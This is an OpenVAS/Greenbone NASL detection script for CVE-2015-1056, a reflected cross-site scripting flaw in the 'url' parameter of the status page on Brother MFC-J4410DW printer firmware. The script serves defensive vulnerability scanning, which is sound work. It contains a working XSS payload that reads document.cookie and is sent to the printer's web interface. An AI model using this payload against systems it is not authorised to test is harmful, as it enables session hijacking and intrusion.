if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805320" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2015-1056" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2015-01-12 20:15:26 +0530 (Mon, 12 Jan 2015)" );
	script_name( "Brother MFC Administration Reflected Cross-Site Scripting Vulnerabilities - Jan15" );
	script_tag( name: "summary", value: "This host is installed with MFC-J4410DW
  model printer firmware and is prone to cross-site scripting vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request
  and check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Flaw is due to improper validation of
  'url' parameter in 'status.html' page before being returned to the user." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to execute arbitrary HTML and script code in a users browser
  session in the context of an affected site." );
	script_tag( name: "affected", value: "Brother MFC-J4410DW with F/W Versions J and K" );
	script_tag( name: "solution", value: "Upgrade to latest firmware version." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://seclists.org/bugtraq/2015/Jan/19" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
cmsPort = http_get_port( default: 80 );
url = "/general/status.html";
req = http_get( item: url, port: cmsPort );
res = http_send_recv( port: cmsPort, data: req );
if(res && ContainsString( res, ">Brother MFC-J4410DW series<" )){
	url += "?url=\"/><script>alert(document.cookie)</script><input type=\"hidden\" value=\"";
	if(http_vuln_check( port: cmsPort, url: url, check_header: TRUE, pattern: "<script>alert\\(document.cookie\\)</script>" )){
		report = http_report_vuln_url( port: cmsPort, url: url );
		security_message( port: cmsPort, data: report );
		exit( 0 );
	}
}

